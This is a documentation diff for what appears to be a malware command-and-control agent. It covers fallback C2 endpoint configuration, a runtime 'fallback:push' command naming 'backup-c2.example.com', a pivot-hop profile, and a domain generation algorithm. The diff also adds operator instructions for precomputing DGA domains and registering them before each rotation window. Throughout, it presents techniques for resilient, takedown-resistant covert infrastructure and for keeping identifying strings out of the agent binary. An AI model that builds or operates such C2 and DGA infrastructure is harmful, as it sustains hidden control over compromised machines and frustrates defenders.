@@ -33,13 +33,13 @@ In the JSON file the strategy is given as its **u8 tag** (second element of the 
 > **Breaking change:** the fallback file is now a **positional JSON array** with no
 > field names (this keeps field-name strings out of the agent binary). Old
 > object-format files (`{"endpoints": [...], "strategy": "priority", ...}`) **no
-> longer parse** — the builder rejects them with
+> longer parse** - the builder rejects them with
 > `Invalid fallback JSON (expected positional array format)`, and anywhere a parse
 > error is swallowed the config silently falls back to defaults. **Convert your
 > files before building.** All templates in `fallback_profiles/` are already
 > converted.
 
-Top level (`FallbackConfig`) — a 3-element array:
+Top level (`FallbackConfig`) - a 3-element array:
 
 | Index | Field | Type | Default if omitted |
 |-------|-------|------|--------------------|
@@ -47,7 +47,7 @@ Top level (`FallbackConfig`) — a 3-element array:
 | 1 | `strategy` | u8 tag (see Strategies) | `2` (priority) |
 | 2 | `dead_time_secs` | number | `300` |
 
-Each endpoint (`FallbackEndpoint`) — an 8-element array. Trailing elements may be
+Each endpoint (`FallbackEndpoint`) - an 8-element array. Trailing elements may be
 omitted and fall back to the defaults shown:
 
 | Index | Field | Type | Default | Description |
@@ -61,7 +61,7 @@ omitted and fall back to the defaults shown:
 | 6 | `weight` | number | `1` | Higher = more likely (random) |
 | 7 | `max_failures` | number | `5` | Mark dead after N consecutive failures |
 
-Example (`fallback_profiles/simple_failover.json` — two HTTPS servers, failover strategy, 10-minute dead time):
+Example (`fallback_profiles/simple_failover.json` - two HTTPS servers, failover strategy, 10-minute dead time):
 
 ```json
 [
@@ -73,6 +73,19 @@ Example (`fallback_profiles/simple_failover.json` — two HTTPS servers, failove
   600
 ]
 ```
+
+### Runtime Replacement (`fallback:push`)
+
+The fallback set can be replaced on a live agent without a rebuild:
+
+```
+fallback:push|[[["backup-c2.example.com",443,4,null,null,0,1,5]],3,600]
+```
+
+The payload is the same positional `FallbackConfig` JSON as the build-time
+file. It must contain at least one endpoint (the agent refuses an empty set so
+it cannot be locked onto the primary only) and takes effect on the next
+reconnect. `fallback:config` shows the currently active set and DGA status.
 
 ### Dead Endpoint Handling
 
@@ -88,6 +101,7 @@ When an endpoint accumulates `max_failures` consecutive failures it is marked de
 | `corporate_proxy.json` | HTTPS through corp proxy + direct TLS backup |
 | `mixed_transport.json` | HTTPS -> TLS -> named pipe cascade |
 | `weighted_random.json` | 60/30/10 weighted distribution |
+| `pivot_chain.json` | Single TCP endpoint template for a downstream pivot hop (`UPSTREAM_HOP_HOST:5001`, tolerant `max_failures`) |
 | `staged_infrastructure.json` | Short-haul (disposable) + long-haul (persistent) |
 
 See `fallback_profiles/` for full JSON examples.
@@ -101,7 +115,7 @@ The DGA extends the fallback system with algorithmically-derived domains. Both t
 ### How It Works
 
 1. **Seed**: A per-campaign `u64` is embedded at build time with `--dga-seed`.
-2. **Window**: The current Unix timestamp divided by `--dga-window` (default 86400 s = 1 day) gives a window index. The domain set rotates on each window boundary.
+2. **Window**: The current Unix timestamp divided by `--dga-window` (default 86400 s = 1 day) gives a window index. The domain set rotates on each window boundary. The agent tracks the active window at runtime (`FallbackManager::rotate_dga_if_window_changed`): when the window rolls over, the old DGA endpoints are removed and the new window's set is generated and appended - no restart or rebuild needed.
 3. **Generation**: For each index `0..count`, the algorithm mixes `(seed, window, index)` through FNV-1a and maps the output to a syllable-based hostname (e.g., `bekal.com`, `torinvex.net`). The result looks like a plausible-but-unregistered domain rather than a hash string.
 4. **TLD sampling**: The TLD is selected from `--dga-tlds` using high bits of the hash, keeping it separate from the hostname generation.
 5. **Integration**: DGA domains are appended to the fallback list with `priority ≥ 100`, lower than any statically-configured endpoint. They activate only after all explicit endpoints have been exhausted.
@@ -133,10 +147,25 @@ cargo run --bin builder -- \
 #    before the old window expires.
 ```
 
-A utility script (`tools/dga_precompute.py`) can generate the domain list for any seed and date range:
+`tools/dga_precompute.py` (Python 3 stdlib only) generates the domain list
+operator-side. It mirrors `src/agent/dga.rs` exactly (same FNV-1a mix,
+syllable tables, and TLD selection), so its output is byte-identical to what
+agents carrying the same seed will try:
+
 ```bash
-python3 tools/dga_precompute.py --seed 9183726450 --days 7 --tlds com,net,org
+# Today's domains for a seed (daily window)
+python3 tools/dga_precompute.py --seed 9183726450 --tlds com,net,org
+
+# A specific UTC date, 32 domains, hourly rotation
+python3 tools/dga_precompute.py --seed 42 --date 2026-03-15 \
+    --window-secs 3600 --count 32 --tlds com,net,io
+
+# A raw window index instead of a date
+python3 tools/dga_precompute.py --seed 42 --window 20000 --tlds com
 ```
+
+Run it per window (day) and register the printed domains before the agent's
+window rolls over.
 
 ### Builder Flags
 
